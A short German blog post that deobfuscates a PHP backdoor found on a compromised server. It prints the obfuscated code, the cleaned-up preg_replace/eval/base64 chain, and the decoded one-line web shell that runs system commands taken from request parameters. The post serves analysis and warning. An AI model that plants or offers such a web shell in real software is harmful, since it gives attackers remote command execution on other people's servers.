Ominoeser MD5 Hash
##################
:date: 2013-01-18 16:29
:tags: de, hack, php, obfuscation

Ich haette es fast uebersehen. Letztens dachte ich mir, dass ich mir nochmal die 
ominoese Datei vornehme, die ein ScriptKiddy auf einem Server hinterlassen hat.
Ein bisschen aufgeraeumt sieht es so aus:

 .. code-block :: php

    <?php       
    $VbEgX="\x65va\x6c\x28\x62\x61se6\x34_de\x63\x6f\x64\x65\x28'"; 
    $fJJe="QH\1165c3RlbS\x67kX1JFUV\126FU1\122bYV0pO2RpZShtZD\x55oMSkpOw=\075'))";  
    $qcBGZTFw="p\x72eg_\x72\x65p\x6cac\x65";  //preg_replace
    $ASwXqM="/\x2e\x2a/\x65";
    $qcBGZTFw($ASwXqM, $VbEgX.$fJJe, "");  

Wer Mag? Eigentlich ist es ziemlich einfach.
    
 .. code-block :: php

    <?php   
    $VbEgX="eval(base64_decode('";     
    $fJJe="QHN5c3RlbSgkX1JFUVVFU1RbYV0pO2RpZShtZDUoMSkpOw=='))";
    $qcBGZTFw="preg_replace";
    $ASwXqM="/.*/e";
    preg_replace("/.*/e",eval(base64_decode('QHN5c3RlbSgkX1JFUVVFU1RbYV0pO2RpZShtZDUoMSkpOw==')),"");

Und dreinmal duerft ihr raten was in dem base64 drinsteht

 .. code-block :: php

    <?php
    @system($_REQUEST[a]);die(md5(1));

Das erklaert auch die $_POST Requests auf die Datei.
Traut dem ganzen einfach NIE!

so long
